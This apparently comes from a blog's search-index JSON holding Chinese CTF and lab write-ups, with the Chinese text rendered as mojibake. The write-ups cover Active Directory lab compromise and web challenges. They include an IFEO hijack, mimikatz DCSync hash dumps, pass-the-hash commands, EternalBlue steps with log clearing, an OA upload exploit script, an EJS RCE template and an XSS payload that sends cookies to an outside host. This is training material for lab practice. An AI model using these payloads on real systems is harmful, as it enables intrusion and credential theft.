\u0026#39;Ald@rLMWuy7Z!#\u0026#39; è¿™é‡Œè¦ç”¨rdesktopç™»ï¼Œrdpç™»ä¸ä¸Š\nä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œæ”¹ä¸ªå¯†ç å°±è¡Œäº†\nä½†æ˜¯æ”¹å®Œå¯†ç è¿™å°æœºè¿˜æ˜¯ç™»ä¸ä¸Šï¼Œæ²¡æœ‰ç™»é™†æƒé™\næ‰€ä»¥æˆ‘ä»¬å°è¯•ç”¨è¿™ä¸ªä¿®æ”¹åçš„è´¦å·å¯†ç å†å»ç™»è¿™ä¸ªè´¦å·çš„å¦ä¸€å°æœºå­\næˆåŠŸåœ¨46ä¸­ç™»å…¥ï¼Œåé¢è¿˜æ˜¯ç”¨rdpå§ï¼Œrdesktopä¹Ÿå¤ªå¡äº†\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 ä¿¡æ¯æ”¶é›†ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æ‹¿ä¸‹åŸŸå†…çš„ä¸€å°æœºå­äº†\nsysteminfo è¿™å°æœºå­ä¸å‡ºç½‘ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å…±äº«æ–‡ä»¶å¤¹çš„æ–¹å¼æ¥ä¼ æ–‡ä»¶\nè¿™é‡Œæˆ‘æ˜¯ç”¨ç¬¬ä¸€å°æœºå­(172.22.8.18)ï¼Œå°†æ–‡ä»¶å¤¹C:/xrntkkå…±äº«ç»™(172.22.8.46)\nåœ¨46ä¸ŠWin+Rå¹¶è¾“å…¥\n\\\\172.22.8.18 è¾“å…¥18å…±äº«æ–‡ä»¶çš„è´¦å·å¯†ç å³å¯\næ¥ç€æˆ‘ä»¬ç”¨bloodhoundæ¥è¿›è¡Œä¸€ä¸‹åŸŸå†…ä¿¡æ¯æ”¶é›†\nSharpHound.exe -c all å°†æ•°æ®é‡‡é›†å®Œç”Ÿæˆçš„zipæ–‡ä»¶ï¼Œä¸Šä¼ å¯¼å…¥åˆ°BloodHoundåˆ†æ\nä»å›¾ä¸­ï¼Œæˆ‘ä»¬ä¼šå‘ç°46è¿™å°æœºå­çš„ç”¨æˆ·æ˜¯åŸŸç®¡ï¼Œé‚£æˆ‘ä»¬æ¥ä¸‹æ¥å°±è¦æƒ³åŠæ³•åœ¨è¿™å°æœºå­ä¸Šææƒï¼Œç„¶åæ‹¿ä¸‹åŸŸæ§\næ ¹æ®å‰é¢çš„hint\nDo you know how to hijack Image? æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¥ä¸‹æ¥è¦è¿›è¡Œé•œåƒåŠ«æŒ(IFEO)ææƒ\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯è·å–æŒ‡å®šæ³¨å†Œè¡¨è·¯å¾„çš„è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚\nNT AUTHORITY\\Authenticated Users æˆ‘ä»¬å¯ä»¥å‘ç°å…¨éƒ¨å·²ç™»å½•ç”¨æˆ·éƒ½å¯ä»¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œä¿®æ”¹\né‚£æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨è¿›è¡Œæ˜ åƒåŠ«æŒ\næˆ‘ä»¬è¿™é‡Œé€šè¿‡å°†æ”¾å¤§é•œå¯åŠ¨çš„magnify.exeæ›¿æ¢æˆC:\\windows\\system32\\cmd.exeï¼Œæ¥è¿›è¡Œææƒ\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; ä¿®æ”¹åé€‰æ‹©é”å®š\nåœ¨é”å®šé¡µé¢é€‰æ‹©æ”¾å¤§é•œå³å¯\ntype c:\\Users\\Administrator\\flag\\flag02.txt æ¥ç€æˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªç”¨æˆ·è®©rdpå¯ä»¥è¿ä¸Šå»\nFLAG3 æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§„çš„å°†åŸŸå†…ç”¨æˆ·çš„å“ˆå¸Œdumpä¸‹æ¥\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt ç»“æœ\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! ä¹‹åå°±å¯ä»¥è¿›è¡Œæ¨ªå‘ç§»åŠ¨äº†\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt æ‹¿åˆ°æœ€åä¸€ä¸ªflag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} è¿™é¢˜ç”¨csæ‰“ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œä½†æ˜¯ä¸€å¼€å§‹æ²¡è€ƒè™‘åˆ°ï¼Œæ‰€ä»¥åé¢ä¹Ÿä¸€ç›´æ²¡ç”¨ã€‚\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Tsclient-Writeup"},{"content":" å‚è€ƒæ–‡ç« \nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\nèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\nFLAG1 fscanæ‰«ä¸€ä¸‹\n./fscan.exe -h 39.99.139.119 ç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\nå…ˆç”¨vshellä¸Šçº¿\nè¯»flagéœ€è¦ææƒ\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\nä¼ ä¸ªlinpeasæ‰«ä¸€ä¸‹\n./linpeas_linux_amd64 \u0026gt; output.txt åœ¨å†å²æ–‡ä»¶ä¸­æ‰¾åˆ°ç–‘ä¼¼è¯»flagçš„å‘½ä»¤\nå…¶å®è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„sudoææƒ\næ¸—é€æµ‹è¯•ï¼šLinuxææƒç²¾è®²ï¼ˆä¸‰ï¼‰ä¹‹sudoæ–¹æ³•ç¬¬ä¸‰æœŸ_nmap sudo ææƒ-CSDNåšå®¢\nmysql æ˜¯é…ç½®äº† sudo å…å¯†ä½¿ç”¨çš„ï¼Œå¯ä»¥ä½¿ç”¨ mysql ææƒï¼Œé€šè¿‡mysqlæ‰§è¡Œå‘½ä»¤æ¥è¯»flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- æ¥ä¸‹æ¥æ­ä»£ç†\næŸ¥å†…ç½‘ip\næ¥ç€ä¼ ä¸€ä¸ªfscanæ‰«ä¸€ä¸‹å†…ç½‘\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 æ”¶é›†åˆ°çš„ä¿¡æ¯\n172.22.1.2:DCåŸŸæ§\r172.22.1.21:Windowsçš„æœºå™¨å¹¶ä¸”å­˜åœ¨MS17-010 æ¼æ´\r172.22.1.18:ä¿¡å‘¼OAåŠå…¬ç³»ç»Ÿ FLAG2 å…ˆçœ‹ä¿¡å‘¼\nå¼±å£ä»¤æˆåŠŸç™»å…¥admin/admin123\nä¿¡å‘¼ååŒåŠå…¬ç³»ç»Ÿv2.2.8å­˜åœ¨æ–‡ä»¶ä¸Šä¼ æ¼æ´\n[Awesome-POC/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md at master Â· Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OAäº§å“æ¼æ´/ä¿¡å‘¼OA qcloudCosAction.php ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) å†™é©¬ä¹‹åç›´æ¥è¯»flagå°±è¡Œ\nflag02: 2ce3-4813-87d4- FLAG3 æ°¸æ’ä¹‹è“å¯ä»¥ç”¨msfæ‰“\nç°åœ¨kaliä¸Šç”¨proxychains4ç®€å•é…ä¸ªä»£ç†\nproxychains4 msfconsole\rsearch ms17-010 æœ‰å››ä¸ªä¸åŒçš„æ¨¡å—\nè¿™é‡Œä½¿ç”¨ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºåˆ©ç”¨èŒƒå›´æ¯”è¾ƒå¹¿\nuse exploit/windows/smb/ms17_010_eternalblue # é€‰æ‹©ä½¿ç”¨çš„æ¨¡å—\rset payload windows/x64/meterpreter/bind_tcp_uuid # è®¾ç½®payloadï¼Œå¯ä»¥é€šè¿‡show payloadsæŸ¥çœ‹\rset RHOSTS 172.22.1.21 # è®¾ç½®é¶æœºçš„ip\rexploit # å‘èµ·æ”»å‡» æˆåŠŸäº†\nmeterpreter \u0026gt; screenshot # æ•è·å±å¹•\rmeterpreter \u0026gt; upload hello.txt c:// #ä¸Šä¼ æ–‡ä»¶\rmeterpreter \u0026gt; download d://1.txt # ä¸‹è½½æ–‡ä»¶\rmeterpreter \u0026gt; shell # è·å–cmd\rmeterpreter \u0026gt; clearev # æ¸…é™¤æ—¥å¿— load kiwi # è°ƒç”¨mimikatzæ¨¡å—\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·çš„ä¿¡æ¯(åŒ…æ‹¬å“ˆå¸Œå€¼) æ‹¿åˆ°Administrator ç”¨æˆ·çš„ hashï¼Œæ¥ç€ä½¿ç”¨ crackmapexec æ¥è¿›è¡Œå“ˆå¸Œä¼ é€’æ”»å‡»ï¼Œæ¥å®ç° DCåŸŸæ§ ä¸Šçš„ä»»æ„å‘½ä»¤æ‰§è¡Œ\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; æ‹¿åˆ°æœ€åä¸€ä¸ªflag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003eå‚è€ƒæ–‡ç« \u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eèœé¸¡ç¬¬ä¸€ä¸ªé€šå…³çš„é¶åœºOrz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscanæ‰«ä¸€ä¸‹\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç›´æ¥ç”¨thinkphpguiå†™é©¬è¿èšå‰‘\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆç”¨vshellä¸Šçº¿\u003c/p\u003e\n\u003cp\u003eè¯»flagéœ€è¦ææƒ\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"æ˜¥ç§‹äº‘é•œ-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman æ‹¿åˆ°ç¯å¢ƒ\nä¸€ä¸ªå°æ¸¸æˆï¼ŒçŒœæµ‹åº”è¯¥æ˜¯jså®¡è®¡\næŸ¥çœ‹index.jså‘ç°ä»£ç è¿›è¡Œäº†æ··æ·†\nå¯ä»¥ç”¨å·¥å…·åæ··æ·†ä¸€ä¸‹ï¼Œå¢åŠ ä¸€ä¸‹å¯è¯»æ€§\nhttps://tool.yuanrenxue.cn/decode_obfuscator\nåæ··æ·†ä¹‹åæ‰¾åˆ°è¿™ä¸ª\næ„Ÿè§‰æ˜¯æ …æ ï¼Œè§£å¯†æ‹¿åˆ°flag\nLevel 47 BandBomb æ–‡ä»¶ä¸Šä¼ \né™„ä»¶æœ‰æºç \n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 9 10app.use(\u0026#39;/static\u0026#39;, express.static(path.join(__dirname, \u0026#39;public\u0026#39;))); 11app.use(express.json()); 12 13const storage = multer.diskStorage({ 14 destination: (req, file, cb) =\u0026gt; { 15 const uploadDir = \u0026#39;uploads\u0026#39;; 16 if (!fs.existsSync(uploadDir)) { 17 fs.mkdirSync(uploadDir); 18 } 19 cb(null, uploadDir); 20 }, 21 filename: (req, file, cb) =\u0026gt; { 22 cb(null, file.originalname); 23 } 24}); 25 26const upload = multer({ 27 storage: storage, 28 fileFilter: (_, file, cb) =\u0026gt; { 29 try { 30 if (!file.originalname) { 31 return cb(new Error(\u0026#39;æ— æ•ˆçš„æ–‡ä»¶å\u0026#39;), false); 32 } 33 cb(null, true); 34 } catch (err) { 35 cb(new Error(\u0026#39;æ–‡ä»¶å¤„ç†é”™è¯¯\u0026#39;), false); 36 } 37 } 38}); 39 40app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { 41 const uploadsDir = path.join(__dirname, \u0026#39;uploads\u0026#39;); 42 43 if (!fs.existsSync(uploadsDir)) { 44 fs.mkdirSync(uploadsDir); 45 } 46 47 fs.readdir(uploadsDir, (err, files) =\u0026gt; { 48 if (err) { 49 return res.status(500).render(\u0026#39;mortis\u0026#39;, { files: [] }); 50 } 51 res.render(\u0026#39;mortis\u0026#39;, { files: files }); 52 }); 53}); 54 55app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { 56 upload.single(\u0026#39;file\u0026#39;)(req, res, (err) =\u0026gt; { 57 if (err) { 58 return res.status(400).json({ error: err.message }); 59 } 60 if (!req.file) { 61 return res.status(400).json({ error: \u0026#39;æ²¡æœ‰é€‰æ‹©æ–‡ä»¶\u0026#39; }); 62 } 63 res.json({ 64 message: \u0026#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸ\u0026#39;, 65 filename: req.file.filename 66 }); 67 }); 68}); 69 70app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 71 const { oldName, newName } = req.body; 72 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 73 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 74 75 if (!oldName || !newName) { 76 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 77 } 78 79 fs.rename(oldPath, newPath, (err) =\u0026gt; { 80 if (err) { 81 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 82 } 83 res.json({ message: \u0026#39; \u0026#39; }); 84 }); 85}); 86 87app.listen(port, () =\u0026gt; { 88 console.log(`æœåŠ¡å™¨è¿è¡Œåœ¨ http://localhost:${port}`); 89}); è¿™é¢˜æœ‰ç‚¹åƒ24å›½èµ›çš„ezjs\næ–‡ç«  - å¯¹ejså¼•æ“æ¼æ´åŠå‡½æ•°ç‰¹æ€§çš„åˆ©ç”¨ - å…ˆçŸ¥ç¤¾åŒº\nå¯ä»¥çœ‹åˆ°åœ¨ /rename è·¯ç”±\n1app.post(\u0026#39;/rename\u0026#39;, (req, res) =\u0026gt; { 2 const { oldName, newName } = req.body; 3 const oldPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, oldName); 4 const newPath = path.join(__dirname, \u0026#39;uploads\u0026#39;, newName); 5 6 if (!oldName || !newName) { 7 return res.status(400).json({ error: \u0026#39; \u0026#39; }); 8 } 9 10 fs.rename(oldPath, newPath, (err) =\u0026gt; { 11 if (err) { 12 return res.status(500).json({ error: \u0026#39; \u0026#39; + err.message }); 13 } 14 res.json({ message: \u0026#39; \u0026#39; }); 15 }); 16}); è¿™ä¸ªè·¯ç”±ä¼šå°†uploadsç›®å½•ä¸­çš„æ–‡ä»¶é‡å‘½å\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·¯ç”±ï¼Œé€šè¿‡ç›®å½•ç©¿è¶Šå¯¹ä»»æ„æ–‡ä»¶è¿›è¡Œç§»åŠ¨å’Œé‡å‘½å\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸Šä¼ æ¶æ„çš„ejsåˆ°uploadsç›®å½•ï¼Œæ¥ç€é€šè¿‡/renameè·¯ç”±å°†æˆ‘ä»¬ä¸Šä¼ çš„æ¶æ„ejsæ–‡ä»¶è¦†å†™æ‰/è·¯ç”±çš„æ¨¡æ¿æ–‡ä»¶mortis.ejså®ç°RCE\neval.ejs\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;whoami\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å°†ejsä¸Šä¼ \nè¦†å†™åŸæ¥çš„ejs\nè®¿é—®/\nè¿™é¢˜flagè—åœ¨ç¯å¢ƒå˜é‡é‡Œ\npayload:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt; \u0026lt;%= process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;printenv\u0026#39;) %\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Level 69 MysteryMessageBoard å¯†ç çˆ†ç ´ï¼ŒXSS cookieçªƒå–\nçˆ†å‡ºæ¥ shallot/888888\nç™»è¿›å»çœ‹åˆ°ä¸€ä¸ªç•™è¨€æ¿\nçŒœæµ‹æ˜¯xssï¼Œæµ‹è¯•ä¸€ä¸‹\n\u0026lt;script\u0026gt;alert(\u0026#39;XSS\u0026#39;)\u0026lt;/script\u0026gt; åŒæ—¶é€šè¿‡dirsearchæ‰«åˆ°äº†/adminè·¯ç”±\næ ¹æ®è¿™å¥è¯å¤§æ¦‚å¯ä»¥çŒœåˆ°ï¼Œè®¿é—®/adminè·¯ç”±çš„æ—¶å€™åº”è¯¥ä¼šåœ¨åç«¯ä»¥adminçš„èº«ä»½æ¥è®¿é—®ç•™è¨€æ¿\nä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥è¿›è¡Œcookieçªƒå–\npayload:\n\u0026lt;script\u0026gt;document.location=\u0026#39;http://dfny33.ceye.io?\u0026#39;+document.cookie;\u0026lt;/script\u0026gt; å°†payloadè¾“å‡ºåœ¨ç•™è¨€æ¿ï¼Œç„¶åè®¿é—®/admin\næˆåŠŸæ‹¿åˆ°adminçš„cookie\næ‹¿adminçš„cookieè®¿é—®/flagå³å¯æ‹¿åˆ°flag\nLevel 25 åŒé¢äººæ´¾å¯¹ è¿™é“é¢˜æœ‰ä¸¤ä¸ªç¯å¢ƒï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯reï¼Œå…¶å®æ„Ÿè§‰æ›´åƒæ˜¯misc\nè®¿é—®app.service-webå¯ä»¥æ‹¿åˆ°ä¸€ä¸ªmainæ–‡ä»¶\næ˜¯ä¸€ä¸ªelfæ–‡ä»¶\nç”¨exeinfo PEæŸ¥åˆ°ç”¨upxåŠ å£³äº†\nç”¨upxå®˜æ–¹å·¥å…·å°±å¯ä»¥è„±å£³\nhttps://github.com/upx/upx/releases/latest\nè„±å£³ä¹‹åç”¨idaæ‰“å¼€\nå¯ä»¥æ‰¾åˆ°ä¸€æ®µå…³äºminioçš„å¯†é’¥ä¿¡æ¯\n.noptrdata:0000000000D614E0\t000000AA\tC\tminio:\\r\\n endpoint: \\\u0026#34;127.0.0.1:9000\\\u0026#34;\\r\\n access_key: \\\u0026#34;minio_admin\\\u0026#34;\\r\\n secret_key: \\\u0026#34;JPSQ4NOBvh2/W7hzdLyRYLDm0wNRMG48BL09yOKGpHs=\\\u0026#34;\\r\\n bucket: \\\u0026#34;prodbucket\\\u0026#34;\\r\\n key: \\\u0026#34;update\\\u0026#34; é‚£æˆ‘ä»¬å¤§æ¦‚å°±èƒ½çŒœåˆ°å¦ä¸€ä¸ªç¯å¢ƒåº”è¯¥å°±æ˜¯è¿™ä¸ªminioçš„æœåŠ¡\nç”¨mcé€šè¿‡Access Keyå’ŒSecret Keyè¿æ¥ä¸Šå»\né‡Œé¢æœ‰ä¸¤ä¸ªå‚¨å­˜æ¡¶\nå°†ä¸¤ä¸ªå‚¨å­˜æ¡¶éƒ½ä¸‹è½½ä¸‹æ¥\n/hintsé‡Œé¢æ”¾çš„æ˜¯8080æœåŠ¡çš„æºç ï¼Œ/prodbucketé‡Œé¢æ˜¯æºç ç¼–è¯‘åçš„æ–‡ä»¶å«åšupdateï¼ŒçŒœæµ‹æ˜¯çƒ­æ›´æ–°\nçœ‹ä¸€ä¸‹æºç \n1package main 2 3import ( 4\t\u0026#34;level25/fetch\u0026#34; 5\t\u0026#34;level25/conf\u0026#34; 6\t\u0026#34;github.com/gin-gonic/gin\u0026#34; 7\t\u0026#34;github.com/jpillora/overseer\u0026#34; 8) 9 10func main() { 11\tfetcher := \u0026amp;fetch.MinioFetcher{ 12\tBucket: conf.MinioBucket, 13\tKey: conf.MinioKey, 14\tEndpoint: conf.MinioEndpoint, 15\tAccessKey: conf.MinioAccessKey, 16\tSecretKey: conf.MinioSecretKey, 17\t} 18\toverseer.Run(overseer.Config{ 19\tProgram: program, 20\tFetcher: fetcher, 21\t}) 22 23} 24 25func program(state overseer.State) { 26\tg := gin.Default() 27\tg.StaticFS(\u0026#34;/\u0026#34;, gin.Dir(\u0026#34;.\u0026#34;, true)) 28\tg.Run(\u0026#34;:8080\u0026#34;) 29} æˆ‘ä»¬å¯ä»¥çŒœæµ‹/è·¯ç”±å±•ç¤ºçš„è¿™ä¸ª.ç›®å½•å°±æ˜¯å‰é¢æˆ‘ä»¬ä¸‹å‘¨mainæ–‡ä»¶çš„ç›®å½•\næˆ‘ä»¬å¯ä»¥æŠŠ.æ”¹æˆæ ¹ç›®å½•/ï¼Œç„¶åå°†ç¼–è¯‘åçš„æºç è¦†å†™æ‰åŸæ¥çš„updateï¼Œçƒ­æ›´æ–°åï¼Œæˆ‘ä»¬å°±èƒ½ç›´æ¥è®¿é—®æ ¹ç›®å½•äº†\npayload:\npackage main import ( \u0026#34;level25/fetch\u0026#34; \u0026#34;level25/conf\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;github.com/jpillora/overseer\u0026#34; ) func main() { fetcher := \u0026amp;fetch.MinioFetcher{ Bucket: conf.MinioBucket, Key: conf.MinioKey, Endpoint: conf.MinioEndpoint, AccessKey: conf.MinioAccessKey, SecretKey: conf.MinioSecretKey, } overseer.Run(overseer.Config{ Program: program, Fetcher: fetcher, }) } func program(state overseer.State) { g := gin.Default() g.StaticFS(\u0026#34;/abc\u0026#34;, gin.Dir(\u0026#34;/\u0026#34;, true)) g.Run(\u0026#34;:8080\u0026#34;) } è¿™é‡Œæˆ‘å°†/è·¯ç”±æ”¹æˆäº†/abcï¼Œå› ä¸ºä¸çŸ¥é“ä¸ºå•¥æˆ‘ç”¨/è·¯ç”±ä¸è¡Œ\nå°†æºç 